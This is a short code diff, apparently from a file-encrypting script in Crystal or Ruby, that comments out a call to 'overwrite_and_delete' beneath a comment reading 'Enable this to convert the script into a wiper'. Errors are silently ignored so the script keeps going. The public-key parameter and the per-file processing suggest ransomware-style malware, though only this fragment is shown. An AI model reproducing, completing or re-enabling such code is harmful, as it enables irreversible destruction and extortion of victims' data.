@@ -30,7 +30,7 @@ def safely_process(file_path : String, public_key_path : String)
     end
 
     # Enable this to convert the script into a wiper:
-    overwrite_and_delete(file_path)
+    #overwrite_and_delete(file_path)
   rescue
     # Error handling: Log or silently ignore errors as per requirement
     puts "An error occurred with file #{file_path}. Continuing..."
